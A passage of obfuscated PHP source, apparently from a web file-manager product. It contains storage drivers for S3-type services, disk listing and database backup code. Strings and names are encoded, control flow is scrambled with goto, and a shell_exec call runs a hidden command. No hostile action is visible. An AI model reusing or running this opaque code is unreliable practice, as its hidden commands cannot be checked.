$‹ˆŞ²÷©; } if ($ˆÚ‘üë == $›Ïóô‚á[192]) { $‹ˆŞ²÷© = self::make(Model($›Ïóô‚á[907])->systemRootPathAdd($›Ïóô‚á[612])); } else { $‹ˆŞ²÷© = self::systemPath($›Ïóô‚á[192]); $Öı­ıÑ = self::sourceID($‹ˆŞ²÷©); $‹ˆŞ²÷© = self::make(Model($›Ïóô‚á[907])->mkdir($Öı­ıÑ, $ˆÚ‘üë)); } Model($›Ïóô‚á[847])->set($™ñ•ğŒ¸, $‹ˆŞ²÷©); return $‹ˆŞ²÷©; } public static function systemFolder($›–ÇÑÆ) { $ß¡ö…Ÿ = IO_PATH_SYSTEM_SOURCE . $›–ÇÑÆ; $‘™ÁË›¯ = Cache::get($ß¡ö…Ÿ); if (!$‘™ÁË›¯) { $ôşÀ¢Ò— = IO::infoFullSimple($ß¡ö…Ÿ); if (!$ôşÀ¢Ò—) { $‘™ÁË›¯ = IO::mkdir($ß¡ö…Ÿ, REPEAT_SKIP); } else { $‘™ÁË›¯ = $ôşÀ¢Ò—[$_SERVER[ıÚ˜š²İ][87]]; } Cache::set($ß¡ö…Ÿ, $‘™ÁË›¯, 3600 * 10); } return $‘™ÁË›¯; } public static function defaultDriver() { return Model($_SERVER[ıÚ˜š²İ][844])->defaultDriver(); } public static function defaultDriverInit() { $ÅÏô¹‹” =& $_SERVER[ıÚ˜š²İ]; static $Ã×İƒÄ½ = false; if ($Ã×İƒÄ½) { return $Ã×İƒÄ½; } $¸ôóÀ“’ = self::defaultDriver(); $Ã×İƒÄ½ = IO::init($ÅÏô¹‹”[1395] . $¸ôóÀ“’[$ÅÏô¹‹”[477]] . $ÅÏô¹‹”[1383]); return $Ã×İƒÄ½; } public static function fileTypeList() { $ëŠı¡¹Ø =& $_SERVER[ıÚ˜š²İ]; $ê·Åšµ® = $GLOBALS[$ëŠı¡¹Ø[6]][$ëŠı¡¹Ø[1396]]; foreach ($ê·Åšµ® as $¢…šş³ => $Î™¬ÓÏú) { $¢®ó‘Î = $ëŠı¡¹Ø[1397] . $¢…šş³; $—ü­øŸü = LNG($¢®ó‘Î); if ($¢®ó‘Î != $—ü­øŸü) { $ê·Åšµ®[$¢…šş³][$ëŠı¡¹Ø[32]] = $—ü­øŸü; } } return $ê·Åšµ®; } public static function ioFileDriverGet($ù§¢‚• = '') { $™›•Ö¾ =& $_SERVER[ıÚ˜š²İ]; static $Ú–Ûûä° = array(); static $Â°‰ÃÀÛ = array(); static $ÁÉÎû» = array(); static $¥Ä¿¿ÃÑ = false; if ($¥Ä¿¿ÃÑ === !1) { $¥Ä¿¿ÃÑ = array($™›•Ö¾[582] => array(), $™›•Ö¾[669] => array()); $ËÜıô…Ò = Model($™›•Ö¾[1398])->get(!1, $™›•Ö¾[1399]); foreach ($ËÜıô…Ò as $Æìï—µ¶ => $ğïË–‹¨) { if (!$ğïË–‹¨ || $ğïË–‹¨ == $™›•Ö¾[12]) { continue; } if (strstr($Æìï—µ¶, $™›•Ö¾[1400])) { $òç¢ôöÇ = str_replace($™›•Ö¾[1400], $™›•Ö¾[12], $Æìï—µ¶); $¥Ä¿¿ÃÑ[$™›•Ö¾[582]][$òç¢ôöÇ] = $ğïË–‹¨; } else { if (strstr($Æìï—µ¶, $™›•Ö¾[1401])) { $òç¢ôöÇ = str_replace($™›•Ö¾[1401], $™›•Ö¾[12], $Æìï—µ¶); $¥Ä¿¿ÃÑ[$™›•Ö¾[669]][$òç¢ôöÇ] = $ğïË–‹¨; } } } } $ãÔôĞ÷© = self::defaultDriver(); if (!$ù§¢‚• || !$¥Ä¿¿ÃÑ[$™›•Ö¾[582]] && !$¥Ä¿¿ÃÑ[$™›•Ö¾[669]]) { return $ãÔôĞ÷©; } $€¢‚÷ü‚ = self::getPathSourceID($ù§¢‚•); if (!$€¢‚÷ü‚) { return $ãÔôĞ÷©; } if (isset($Ú–Ûûä°[$€¢‚÷ü‚])) { return $Ú–Ûûä°[$€¢‚÷ü‚]; } $¼ÊĞ¥“ = Model($™›•Ö¾[907])->sourceInfo($€¢‚÷ü‚); $ò£ÁêàÃ = $¼ÊĞ¥“[$™›•Ö¾[573]]; $Á¨ãÌ¾ = array(); if (!$¼ÊĞ¥“) { return $ãÔôĞ÷©; } if ($¼ÊĞ¥“[$™›•Ö¾[191]] == $™›•Ö¾[91]) { if (isset($ÁÉÎû»[$ò£ÁêàÃ])) { return $ÁÉÎû»[$ò£ÁêàÃ]; } if (isset($¥Ä¿¿ÃÑ[$™›•Ö¾[669]][$ò£ÁêàÃ])) { $œÃÆŸ†Í = Model($™›•Ö¾[844])->driverInfo($¥Ä¿¿ÃÑ[$™›•Ö¾[669]][$ò£ÁêàÃ]); $ãÔôĞ÷© = $œÃÆŸ†Í ? $œÃÆŸ†Í : $ãÔôĞ÷©; $ÁÉÎû»[$ò£ÁêàÃ] = $ãÔôĞ÷©; $Ú–Ûûä°[$€¢‚÷ü‚] = $ãÔôĞ÷©; return $ãÔôĞ÷©; } $Á¨ãÌ¾ = self::groupParentUser($ò£ÁêàÃ); } else { if ($¼ÊĞ¥“[$™›•Ö¾[191]] == $™›•Ö¾[512]) { $İß›øŒ— = Model($™›•Ö¾[1402])->getInfo($ò£ÁêàÃ); if ($İß›øŒ—) { $Á¨ãÌ¾ = explode($™›•Ö¾[50], trim($İß›øŒ—[$™›•Ö¾[588]], $™›•Ö¾[50])); $Á¨ãÌ¾ = array_remove_value($Á¨ãÌ¾, $™›•Ö¾[231]); $Á¨ãÌ¾[] = $ò£ÁêàÃ; $Á¨ãÌ¾ = array_reverse($Á¨ãÌ¾); } } } foreach ($Á¨ãÌ¾ as $òñÛÅ»õ) { if (!isset($¥Ä¿¿ÃÑ[$™›•Ö¾[582]][$òñÛÅ»õ])) { continue; } if (isset($Â°‰ÃÀÛ[$òñÛÅ»õ])) { return $Â°‰ÃÀÛ[$òñÛÅ»õ]; } $œÃÆŸ†Í = Model($™›•Ö¾[844])->driverInfo($¥Ä¿¿ÃÑ[$™›•Ö¾[582]][$òñÛÅ»õ]); $ãÔôĞ÷© = $œÃÆŸ†Í ? $œÃÆŸ†Í : $ãÔôĞ÷©; $Â°‰ÃÀÛ[$òñÛÅ»õ] = $ãÔôĞ÷©; break; } if ($¼ÊĞ¥“[$™›•Ö¾[191]] == $™›•Ö¾[91]) { $ÁÉÎû»[$ò£ÁêàÃ] = $ãÔôĞ÷©; } $Ú–Ûûä°[$€¢‚÷ü‚] = $ãÔôĞ÷©; return $ãÔôĞ÷©; } private static function getPathSourceID($•úˆ˜âÓ) { $¨Á‘ƒ³° =& $_SERVER[ıÚ˜š²İ]; static $ñ³©’Ğ— = array(); if (!$•úˆ˜âÓ) { return $¨Á‘ƒ³°[12]; } $¡øÄéÌ = substr($•úˆ˜âÓ, 0, strlen($¨Á‘ƒ³°[485])) == $¨Á‘ƒ³°[485]; $àîòÄÎ = substr($•úˆ˜âÓ, 0, strlen($¨Á‘ƒ³°[1370])) == $¨Á‘ƒ³°[1370]; $ì™•™ƒâ = substr($•úˆ˜âÓ, 0, strlen($¨Á‘ƒ³°[1371])) == $¨Á‘ƒ³°[1371]; if (!$¡øÄéÌ && !$àîòÄÎ && !$ì™•™ƒâ) { return $¨Á‘ƒ³°[12]; } $úĞÌ¯ÓÍ = self::parse($•úˆ˜âÓ); $ü¨ŞÖÙ = $úĞÌ¯ÓÍ[$¨Á‘ƒ³°[1264]]; if ($¡øÄéÌ) { return $úĞÌ¯ÓÍ[$¨Á‘ƒ³°[477]]; } if (isset($ñ³©’Ğ—[$ü¨ŞÖÙ])) { $¸É§‚‚Ÿ = $ñ³©’Ğ—[$ü¨ŞÖÙ]; } else { $¸É§‚‚Ÿ = IO::init($ü¨ŞÖÙ); $ñ³©’Ğ—[$ü¨ŞÖÙ] = $¸É§‚‚Ÿ; } if (isset($¸É§‚‚Ÿ->pathParse[$¨Á‘ƒ³°[1267]])) { return $¸É§‚‚Ÿ->pathParse[$¨Á‘ƒ³°[1267]]; } return $¨Á‘ƒ³°[12]; } private static function groupParentUser($¤áÅ‰˜æ) { $—›™¿ÁÄ =& $_SERVER[ıÚ˜š²İ]; $ïÔ¹Ùøµ = Model($—›™¿ÁÄ[601])->getInfo($¤áÅ‰˜æ); if (!$ïÔ¹Ùøµ) { return array(); } $ø”¬ğêÌ = array_to_keyvalue($ïÔ¹Ùøµ[$—›™¿ÁÄ[1403]], $—›™¿ÁÄ[12], $—›™¿ÁÄ[1404]); $ôÂ’îñÊ = array(); foreach ($ïÔ¹Ùøµ[$—›™¿ÁÄ[1403]] as $¸èï™â²) { $ôÂ’îñÊ[] = $¸èï™â²[$—›™¿ÁÄ[1404]]; $á« Ñ Ï = explode($—›™¿ÁÄ[50], trim($¸èï™â²[$—›™¿ÁÄ[588]], $—›™¿ÁÄ[50])); $á« Ñ Ï = array_remove_value($á« Ñ Ï, $—›™¿ÁÄ[231]); $á« Ñ Ï = array_reverse($á« Ñ Ï); $ôÂ’îñÊ = array_merge($ôÂ’îñÊ, $á« Ñ Ï); } return array_unique($ôÂ’îñÊ); } public static function diskList($—ÀŒÌÏ¹ = true) { $¢ŒµÛ¾³ = $_SERVER[ıÚ˜š²İ][1405]; if ($—ÀŒÌÏ¹) { $–î©ÁÃ = Cache::get($¢ŒµÛ¾³); if (is_array($–î©ÁÃ)) { return $–î©ÁÃ; } } $–î©ÁÃ = self::diskListGet(); Cache::set($¢ŒµÛ¾³, $–î©ÁÃ, 60); return $–î©ÁÃ; } public static function diskListGet() { $ûÃÍéíŒ =& $_SERVER[ıÚ˜š²İ]; $åÆ÷ÙïÑ = array(); if ($GLOBALS[$ûÃÍéíŒ[6]][$ûÃÍéíŒ[1406]] == $ûÃÍéíŒ[1407]) { $ú°¹€¢¬ = $ûÃÍéíŒ[1408]; for ($³í•øğƒ = 0; $³í•øğƒ < strlen($ú°¹€¢¬); $³í•øğƒ++) { $¶Ö×âÊÛ = $ú°¹€¢¬[$³í•øğƒ] . $ûÃÍéíŒ[1409]; if (file_exists($¶Ö×âÊÛ)) { $åÆ÷ÙïÑ[] = $¶Ö×âÊÛ; } } return $åÆ÷ÙïÑ; } if (!function_exists($ûÃÍéíŒ[101])) { $åÆ÷ÙïÑ[] = $ûÃÍéíŒ[918]; return $åÆ÷ÙïÑ; } $ˆ¤¶ëŞ¢ = explode($ûÃÍéíŒ[288], shell_exec($ûÃÍéíŒ[1410])); array_shift($ˆ¤¶ëŞ¢); array_pop($ˆ¤¶ëŞ¢); $†¢Ó¿ï = array($ûÃÍéíŒ[1411], $ûÃÍéíŒ[1412], $ûÃÍéíŒ[1413], $ûÃÍéíŒ[1414], $ûÃÍéíŒ[1415], $ûÃÍéíŒ[1416], $ûÃÍéíŒ[1417], $ûÃÍéíŒ[1418]); foreach ($ˆ¤¶ëŞ¢ as $öÙë»Äß) { $İø•ÌÅ“ = preg_split($ûÃÍéíŒ[1419], $öÙë»Äß); $¶Ö×âÊÛ = $İø•ÌÅ“[count($İø•ÌÅ“) - 1]; if (!strstr($İø•ÌÅ“[0], $ûÃÍéíŒ[1420]) || !$¶Ö×âÊÛ) { continue; } $Ÿ‘³›ÈÜ = rtrim($¶Ö×âÊÛ, $ûÃÍéíŒ[8]) . $ûÃÍéíŒ[8]; if (in_array($Ÿ‘³›ÈÜ, $†¢Ó¿ï)) { continue; } $åÆ÷ÙïÑ[] = $Ÿ‘³›ÈÜ; } return $åÆ÷ÙïÑ; } public static function isSameDisk($®ş‰ØÑ«, $ËÙİ–º) { $¥ç†ÉÂ• =& $_SERVER[ıÚ˜š²İ]; if ($GLOBALS[$¥ç†ÉÂ•[6]][$¥ç†ÉÂ•[1406]] == $¥ç†ÉÂ•[1407]) { return strtolower(substr($®ş‰ØÑ«, 0, 1)) == strtolower(substr($ËÙİ–º, 0, 1)); } $â§øöö = stat($®ş‰ØÑ«); $õÀÅƒ˜º = stat($ËÙİ–º); if ($â§øöö === !1 || $õÀÅƒ˜º === !1) { return !1; } return $â§øöö[$¥ç†ÉÂ•[1421]] === $õÀÅƒ˜º[$¥ç†ÉÂ•[1421]]; $†¡ï€îŞ = self::diskList(); $şñõƒ©— = !1; $êÔòÅ‰¨ = !1; sort($†¡ï€îŞ); $†¡ï€îŞ = array_reverse($†¡ï€îŞ); $®ş‰ØÑ« = rtrim($®ş‰ØÑ«, $¥ç†ÉÂ•[8]) . $¥ç†ÉÂ•[8]; $ËÙİ–º = rtrim($ËÙİ–º, $¥ç†ÉÂ•[8]) . $¥ç†ÉÂ•[8]; foreach ($†¡ï€îŞ as $¸‚Ûë) { $Í¢áşâç = strlen($¸‚Ûë); if (!$şñõƒ©— && substr($®ş‰ØÑ«, 0, $Í¢áşâç) == $¸‚Ûë) { $şñõƒ©— = $¸‚Ûë; } if (!$êÔòÅ‰¨ && substr($ËÙİ–º, 0, $Í¢áşâç) == $¸‚Ûë) { $êÔòÅ‰¨ = $¸‚Ûë; } if ($şñõƒ©— && $êÔòÅ‰¨) { break; } } return $şñõƒ©— === $êÔòÅ‰¨; } public static function transferType($Ñ’ØÙÅŠ, $èÖîù­ê) { $‰‘¶¿Ó =& $_SERVER[ıÚ˜š²İ]; $„Ûûë„€ = self::driverType($Ñ’ØÙÅŠ); $‡ËÖªÔ‰ = self::driverType($èÖîù­ê); if ($„Ûûë„€[$‰‘¶¿Ó[33]] == $‡ËÖªÔ‰[$‰‘¶¿Ó[33]] && $„Ûûë„€[$‰‘¶¿Ó[1422]] == $‡ËÖªÔ‰[$‰‘¶¿Ó[1422]]) { return $‰‘¶¿Ó[1423]; } if ($„Ûûë„€[$‰‘¶¿Ó[33]] == $‰‘¶¿Ó[952] && $‡ËÖªÔ‰[$‰‘¶¿Ó[33]] == $‰‘¶¿Ó[109]) { return $‰‘¶¿Ó[1293]; } if ($„Ûûë„€[$‰‘¶¿Ó[33]] == $‰‘¶¿Ó[109] && $‡ËÖªÔ‰[$‰‘¶¿Ó[33]] == $‰‘¶¿Ó[952]) { return $‰‘¶¿Ó[110]; } return $‰‘¶¿Ó[1424]; } public static function driverType($–¢„ä‘õ) { $™ òè– =& $_SERVER[ıÚ˜š²İ]; $´Ü¶­†¸ = str_replace($™ òè–[1425], $™ òè–[12], strtolower($–¢„ä‘õ->getType())); if ($´Ü¶­†¸ == $™ òè–[834] || $´Ü¶­†¸ == $™ òè–[1426] || $´Ü¶­†¸ == $™ òè–[1427]) { $Üãğ¬Í = self::ioFileDriverGet($™ òè–[485] . $–¢„ä‘õ->pathParse[$™ òè–[1267]] . $™ òè–[404]); $–¢„ä‘õ = IO::init($™ òè–[1395] . $Üãğ¬Í[$™ òè–[477]] . $™ òè–[1383]); } else { if ($´Ü¶­†¸ == $™ òè–[1303] || $´Ü¶­†¸ == $™ òè–[1428]) { $–¢„ä‘õ = IO::init($–¢„ä‘õ->pathParse[$™ òè–[1244]]); } } $üÚÕ¿³ = $–¢„ä‘õ->path; $´Ü¶­†¸ = str_replace($™ òè–[1425], $™ òè–[12], strtolower($–¢„ä‘õ->getType())); if ($´Ü¶­†¸ == $™ òè–[109]) { return array($™ òè–[33] => $™ òè–[109], $™ òè–[1422] => $™ òè–[12], $™ òè–[87] => $üÚÕ¿³, $™ òè–[98] => $–¢„ä‘õ); } return array($™ òè–[33] => $™ òè–[952], $™ òè–[1422] => $–¢„ä‘õ->pathDriver, $™ òè–[87] => $üÚÕ¿³, $™ òè–[98] => $–¢„ä‘õ); } public static function pathDriverType($ˆ•ö¿Øù) { return $ˆ•ö¿Øù ? self::driverType(IO::init($ˆ•ö¿Øù)) : !1; } public static function pathDriverLocal($•¦Ø«•›) { $Çª‰‰ø =& $_SERVER[ıÚ˜š²İ]; $ñÔö¦ê§ = $•¦Ø«•› ? self::driverType(IO::init($•¦Ø«•›)) : !1; return strtolower($ñÔö¦ê§[$Çª‰‰ø[33]]) == $Çª‰‰ø[109] ? !0 : !1; } public static function allowCover($»Œ±», $†şÓÏû = true) { $Ş„Í³Ÿ =& $_SERVER[ıÚ˜š²İ]; if (is_string($»Œ±»)) { $»Œ±» = IO::info($»Œ±»); } if (!$»Œ±» || $»Œ±»[$Ş„Í³Ÿ[33]] == $Ş„Í³Ÿ[78] || $»Œ±»[$Ş„Í³Ÿ[79]] <= 100) { return !1; } if (isset($»Œ±»[$Ş„Í³Ÿ[1429]]) || !$»Œ±»[$Ş„Í³Ÿ[87]]) { return !1; } if (isset($»Œ±»[$Ş„Í³Ÿ[235]]) && !$»Œ±»[$Ş„Í³Ÿ[235]]) { return !1; } static $Úˆ‡æÊó = false; if (!$Úˆ‡æÊó || !$†şÓÏû) { $ó¯•ú– = self::driverType(IO::init($»Œ±»[$Ş„Í³Ÿ[87]])); $ä¨Âë±“ = $ó¯•ú–[$Ş„Í³Ÿ[98]]; $Úˆ‡æÊó = $Ş„Í³Ÿ[197]; if ($ó¯•ú–[$Ş„Í³Ÿ[33]] == $Ş„Í³Ÿ[109]) { $Úˆ‡æÊó = $Ş„Í³Ÿ[1430]; } if ($ó¯•ú–[$Ş„Í³Ÿ[98]] && is_array($ó¯•ú–[$Ş„Í³Ÿ[98]]->config)) { $±Îå—‰ë = $ó¯•ú–[$Ş„Í³Ÿ[98]]->config; if (isset($±Îå—‰ë[$Ş„Í³Ÿ[1431]]) && $±Îå—‰ë[$Ş„Í³Ÿ[1431]]) { $Úˆ‡æÊó = $Ş„Í³Ÿ[1430]; } } $ƒ‡‰Åº‡ = KodIO::defaultDriver(); if (strtolower($ƒ‡‰Åº‡[$Ş„Í³Ÿ[98]]) == $Ş„Í³Ÿ[109] && is_array($ƒ‡‰Åº‡[$Ş„Í³Ÿ[6]])) { $«ÜÛÓŸ« = $ƒ‡‰Åº‡[$Ş„Í³Ÿ[6]][$Ş„Í³Ÿ[1276]]; if (substr($«ÜÛÓŸ«, 0, 2) == $Ş„Í³Ÿ[1432]) { $«ÜÛÓŸ« = str_replace($Ş„Í³Ÿ[1432], BASIC_PATH, $«ÜÛÓŸ«); } $«ÜÛÓŸ« = str_replace($Ş„Í³Ÿ[257], $Ş„Í³Ÿ[8], $«ÜÛÓŸ«); if (substr($»Œ±»[$Ş„Í³Ÿ[87]], 0, strlen($«ÜÛÓŸ«)) == $«ÜÛÓŸ«) { $Úˆ‡æÊó = $Ş„Í³Ÿ[197]; } } } return $Úˆ‡æÊó == $Ş„Í³Ÿ[1430] ? !0 : !1; } } class PathDriverBOS extends PathDriverS3 { public function __construct($¬ß”ïÒ®) { parent::__construct($¬ß”ïÒ®); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } } class PathDriverCOS extends PathDriverBaseS3 { public function __construct($ì«ã‡Æá) { parent::__construct($ì«ã‡Æá); $this->setSignVersion($_SERVER[ıÚ˜š²İ][250]); } public function uploadFormData($ƒÄÊê©, $‡šÉ€ºŸ = 3600) { $Š‚Ù§š =& $_SERVER[ıÚ˜š²İ]; $¨ûÊö³½ = $Š‚Ù§š[232]; $ÑØ¹ï¥˜ = $Š‚Ù§š[1433]; $šÒĞ§¢” = $Š‚Ù§š[264]; $öæ±¥Ì = gmdate($Š‚Ù§š[1434], time() + $‡šÉ€ºŸ); $á²ßëËÕ = (string) time() . $Š‚Ù§š[74] . (string) (time() + $‡šÉ€ºŸ); $ôÅ”ÌÁ‚ = array($Š‚Ù§š[265] => $öæ±¥Ì, $Š‚Ù§š[268] => array(array($Š‚Ù§š[309] => $¨ûÊö³½), array($Š‚Ù§š[269] => $this->bucket), array($Š‚Ù§š[270], $Š‚Ù§š[271], $Š‚Ù§š[12]), array($Š‚Ù§š[273] => $šÒĞ§¢”), array($Š‚Ù§š[1435] => $ÑØ¹ï¥˜), array($Š‚Ù§š[1436] => $this->accessKey), array($Š‚Ù§š[1437] => $á²ßëËÕ))); $ôÅ”ÌÁ‚ = json_encode($ôÅ”ÌÁ‚); $¤¿‚šÔŸ = hash_hmac($Š‚Ù§š[1433], $á²ßëËÕ, $this->secret); $ğÏ®æı© = sha1($ôÅ”ÌÁ‚); $©ùŒí‡¢ = hash_hmac($Š‚Ù§š[1433], $ğÏ®æı©, $¤¿‚šÔŸ); $·ô…½Ã– = array($Š‚Ù§š[309] => $¨ûÊö³½, $Š‚Ù§š[273] => $šÒĞ§¢”, $Š‚Ù§š[280] => base64_encode($ôÅ”ÌÁ‚), $Š‚Ù§š[1435] => $ÑØ¹ï¥˜, $Š‚Ù§š[1436] => $this->accessKey, $Š‚Ù§š[1438] => $á²ßëËÕ, $Š‚Ù§š[1439] => $©ùŒí‡¢, $Š‚Ù§š[209] => $this->getHost()); return $·ô…½Ã–; } public function fileOutImage($ùŠ¢å”€, $¼ş÷Ç®á = 250) { $ıóòüİ˜ =& $_SERVER[ıÚ˜š²İ]; if ($this->size($ùŠ¢å”€) > 1024 * 1024 * 32) { return $this->fileOutImageServer($ùŠ¢å”€, $¼ş÷Ç®á); } $°º‰ñ¨ù = $this->link($ùŠ¢å”€); $°º‰ñ¨ù .= $ıóòüİ˜[1440] . $¼ş÷Ç®á . $ıóòüİ˜[1441]; $this->fileOutLink($°º‰ñ¨ù); } } goto cÛ«ÒØ£¯; B¯ÕÕùªé: class PathDriverS3 extends PathDriverBaseS3 { public function __construct($éœ†…Ÿ¥) { $¦¶á„Â =& $_SERVER[ıÚ˜š²İ]; parent::__construct($éœ†…Ÿ¥); $ãÀÖèï‰ = isset($éœ†…Ÿ¥[$¦¶á„Â[259]]) && $éœ†…Ÿ¥[$¦¶á„Â[259]] == $¦¶á„Â[250] ? $¦¶á„Â[250] : $¦¶á„Â[316]; $this->setSignVersion($ãÀÖèï‰); } public function link($ƒ Óò§§, $¯ŞÔˆê = array()) { return parent::link($ƒ Óò§§, $¯ŞÔˆê); } public function fileOut($ÈşÚ¹óÙ, $Şœñ£å = false, $·Û‡¹‹® = false, $¼²Õ·ê = '') { if ($this->isFileOutServer() || strstr($this->endpoint, $_SERVER[ıÚ˜š²İ][317])) { return parent::fileOutServer($ÈşÚ¹óÙ, $Şœñ£å, $·Û‡¹‹®, $¼²Õ·ê); } parent::fileOut($ÈşÚ¹óÙ, $Şœñ£å, $·Û‡¹‹®, $¼²Õ·ê); } public function fileOutImage($¢òÛ®è¨, $ã­Ïº¬‡ = 250) { if (strstr($this->endpoint, $_SERVER[ıÚ˜š²İ][317])) { return parent::fileOutImageServer($¢òÛ®è¨, $ã­Ïº¬‡); } parent::fileOutImage($¢òÛ®è¨, $ã­Ïº¬‡); } } define($_SERVER[ıÚ˜š²İ][318], 1); define($_SERVER[ıÚ˜š²İ][319], 2); goto DÆ—ÏƒÄ; b‹ù¨ôØÛ: while ($ihoktzjwga < $_SERVER[ıÚ˜š²İ][687]) { if ($ihoktzjwga >= 0) { break; } $ihoktzjwga++; } $_SERVER[æÂ¬Úû¨] = explode($_SERVER[ıÚ˜š²İ][688], gzinflate(substr($_SERVER[ıÚ˜š²İ][689], 10, -8))); $bjlzsecqfw = $_SERVER[ıÚ˜š²İ][690]; goto c‡°Ÿ¶óŒ¶; E­À°ñµ÷Ÿ: class BackupDb { protected static $io; protected static $name; public function __construct() { } public function index() { $ËÎ°•Ë‡ =& $_SERVER[ıÚ˜š²İ]; $èò¦Ô‹Ú = Backup::get(); self::$io = $èò¦Ô‹Ú[$ËÎ°•Ë‡[828]]; self::$name = $èò¦Ô‹Ú[$ËÎ°•Ë‡[32]]; $ˆ¤ö—Óš = new DbManage(); $èŒÕÃì½ = $ˆ¤ö—Óš->dbType(); $§›ˆƒ¨û = array($ËÎ°•Ë‡[855] => $èŒÕÃì½, $ËÎ°•Ë‡[856] => time()); Backup::set($§›ˆƒ¨û); $¦Ğ¬ïÃÍ = $this->tmpFilesPath() . $ËÎ°•Ë‡[857] . self::$name . $ËÎ°•Ë‡[8]; del_dir($¦Ğ¬ïÃÍ); mk_dir($¦Ğ¬ïÃÍ); $ùÒÊ«Ò = $­ÓÙä‹’ = 0; try { $èÉëØ®¥ = $ˆ¤ö—Óš->db()->getTables(); } catch (Exception $îËßªé) { Backup::log($ËÎ°•Ë‡[858] . $îËßªé->getMessage()); return !1; } $èÉëØ®¥ = array_diff($èÉëØ®¥, array($ËÎ°•Ë‡[859], $ËÎ°•Ë‡[860])); foreach ($èÉëØ®¥ as $®éçˆğş) { if ($®éçˆğş == $ËÎ°•Ë‡[861]) { continue; } $ùÒÊ«Ò += $ˆ¤ö—Óš->model($®éçˆğş)->count(); } $ñÁî— = new Task($ËÎ°•Ë‡[862], $ËÎ°•Ë‡[854], $ùÒÊ«Ò, LNG($ËÎ°•Ë‡[863]) . $ËÎ°•Ë‡[864] . LNG($ËÎ°•Ë‡[865])); $GLOBALS[$ËÎ°•Ë‡[866]] = self::$name; foreach ($èÉëØ®¥ as $®éçˆğş) { $ê¯·æŠ¤ = $¦Ğ¬ïÃÍ . $®éçˆğş . $ËÎ°•Ë‡[867]; if ($®éçˆğş == $ËÎ°•Ë‡[861]) { @touch($ê¯·æŠ¤); continue; } $Â¢—’™Ê = null; if ($®éçˆğş == $ËÎ°•Ë‡[868] && $èò¦Ô‹Ú[$ËÎ°•Ë‡[171]] == $ËÎ°•Ë‡[853]) { $Â¢—’™Ê = self::$io; } $­ÓÙä‹’ += $ˆ¤ö—Óš->sqlFromDb($®éçˆğş, $ê¯·æŠ¤, $ñÁî—, $Â¢—’™Ê); } unset($GLOBALS[$ËÎ°•Ë‡[866]]); $ñÁî—->end(); if ($­ÓÙä‹’ > $ùÒÊ«Ò) { $ùÒÊ«Ò = $­ÓÙä‹’; } $§›ˆƒ¨û = array($ËÎ°•Ë‡[855] => $èŒÕÃì½, $ËÎ°•Ë‡[850] => 1, $ËÎ°•Ë‡[869] => $ùÒÊ«Ò, $ËÎ°•Ë‡[870] => $­ÓÙä‹’, $ËÎ°•Ë‡[871] => time()); Backup::set($§›ˆƒ¨û); if ($ùÒÊ«Ò - $­ÓÙä‹’ > 0) { $³šÑÖçù = $ËÎ°•Ë‡[872]; if (!stristr(I18n::getType(), $ËÎ°•Ë‡[873])) { $³šÑÖçù = $ËÎ°•Ë‡[874]; } Backup::log(array($³šÑÖçù, $§›ˆƒ¨û)); return !1; } return !0; } private function tmpFilesPath() { $¦Á ÷÷« =& $_SERVER[ıÚ˜š²İ]; $»§ˆ±…ƒ = TEMP_FILES; if ($GLOBALS[$¦Á ÷÷«[6]][$¦Á ÷÷«[92]][$¦Á ÷÷«[875]]) { $»§ˆ±…ƒ = $GLOBALS[$¦Á ÷÷«[6]][$¦Á ÷÷«[92]][$¦Á ÷÷«[875]]; if (!mk_dir($»§ˆ±…ƒ) || !is_writable($»§ˆ±…ƒ) || !IO::mkfile($»§ˆ±…ƒ . $¦Á ÷÷«[876])) { $»§ˆ±…ƒ = TEMP_FILES; } } return $»§ˆ±…ƒ; } } class BackupDbFile { public function __construct() { } public function index() { $ùûĞ§ƒÊ =& $_SERVER[ıÚ˜š²İ]; $„—±Èó = Backup::get(); $–ëÅ·¢Í = $„—±Èó[$ùûĞ§ƒÊ[32]]; $íûÆ…ˆã = $this->tmpFilesPath() . "\x62\x61\143\153\165\160\137{$–ëÅ·¢Í}\x2f"; $´ºè±àº = $this->backupPath($„—±Èó); if (!($´ºè±àº = IO::mkdir($´ºè±àº))) { Backup::log($ùûĞ§ƒÊ[877] . $´ºè±àº); return !1; } $†ï·ƒµâ = IO::listPath($íûÆ…ˆã); $ûÁŠõË = isset($†ï·ƒµâ[$ùûĞ§ƒÊ[86]]) ? $†ï·ƒµâ[$ùûĞ§ƒÊ[86]] : array(); $ù‡¾ü— = array_sum(array_column($ûÁŠõË, $ùûĞ§ƒÊ[79])); if (!$ù‡¾ü—) { Backup::log($ùûĞ§ƒÊ[878] . $íûÆ…ˆã); return !1; } $…Éúã  = array($ùûĞ§ƒÊ[879] => $ù‡¾ü—, $ùûĞ§ƒÊ[880] => time()); Backup::set($…Éúã ); $¹²ùö = new TaskFileTransfer($ùûĞ§ƒÊ[881], $ùûĞ§ƒÊ[854], count($ûÁŠõË), LNG($ùûĞ§ƒÊ[863]) . $ùûĞ§ƒÊ[464] . LNG($ùûĞ§ƒÊ[865]) . $ùûĞ§ƒÊ[882]); $¹²ùö->task[$ùûĞ§ƒÊ[840]] = $ù‡¾ü—; foreach ($†ï·ƒµâ[$ùûĞ§ƒÊ[86]] as $¢Ñ›´Æ) { $ĞÙ¡ÎñØ = IO::move($¢Ñ›´Æ[$ùûĞ§ƒÊ[87]], $´ºè±àº); if (!$ĞÙ¡ÎñØ) { $¹²ùö->end(); $Ÿ…¦ò ‚ = IO::getLastError($ùûĞ§ƒÊ[883] . $¢Ñ›´Æ[$ùûĞ§ƒÊ[87]] . $ùûĞ§ƒÊ[884] . $´ºè±àº . $ùûĞ§ƒÊ[178]); Backup::log($Ÿ…¦ò ‚); return !1; } } $œ†¡Äó = new DbManage(); $ä¿Ş‚™Ù = $œ†¡Äó->getSqlFile(); if (!$ä¿Ş‚™Ù[$ùûĞ§ƒÊ[885]] || !$ä¿Ş‚™Ù[$ùûĞ§ƒÊ[13]]) { Backup::log($ùûĞ§ƒÊ[886]); return !1; } IO::move($ä¿Ş‚™Ù[$ùûĞ§ƒÊ[885]], $´ºè±àº); IO::move($ä¿Ş‚™Ù[$ùûĞ§ƒÊ[13]], $´ºè±àº); $¹²ùö->end(); $…Éúã  = array($ùûĞ§ƒÊ[887] => $ù‡¾ü—, $ùûĞ§ƒÊ[888] => time()); Backup::set($…Éúã ); return !0; } private function backupPath($¢Ğ ‚×ê) { $ÒëéÎ“¸ =& $_SERVER[ıÚ˜š²İ]; $‚ÙĞ—¶¸ = $¢Ğ ‚×ê[$ÒëéÎ“¸[32]]; $Ê€Ê˜ä¥ = 